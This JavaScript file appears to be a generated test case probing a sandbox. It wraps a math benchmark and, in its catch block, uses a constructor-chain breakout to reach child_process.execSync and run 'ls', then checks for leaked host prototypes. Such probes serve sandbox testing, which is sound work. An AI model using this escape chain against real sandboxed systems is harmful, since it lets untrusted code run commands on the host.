try {
    function partial(n) {
        throw () => {
            return () => {
            };
        };
        var a1 = a2 = a3 = a4 = a5 = a6 = a7 = a8 = a9 = 0;
        var twothirds = 2 / 3;
        var alt = -1;
        var k2 = k3 = sk = ck = 0;
        for (var k = 1; k <= n; k++) {
            k2 = k * k;
            k3 = k2 * k;
            sk = Math.sin(k);
            ck = Math.cos(k);
            alt = -alt;
            a1 += Math.pow(twothirds, k - 1);
            a2 += Math.pow(k, -0.5);
            a3 += 1 / (k * (k + 1));
            a4 += 1 / (k3 * sk * sk);
            a5 += 1 / (k3 * ck * ck);
            a6 += 1 / k;
            a7 += 1 / k2;
            a8 += alt / k;
            a9 += alt / (2 * k - 1);
        }
        return a6 + a7 + a8 + a9;
    }
    var total = 0;
    for (var i = 1024; i <= 16384; i *= 2) {
        total += partial(i);
    }
    var expected = 60.08994194659945;
    if (total != expected) {
        throw 'ERROR: bad result: expected ' + expected + ' but got ' + total;
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}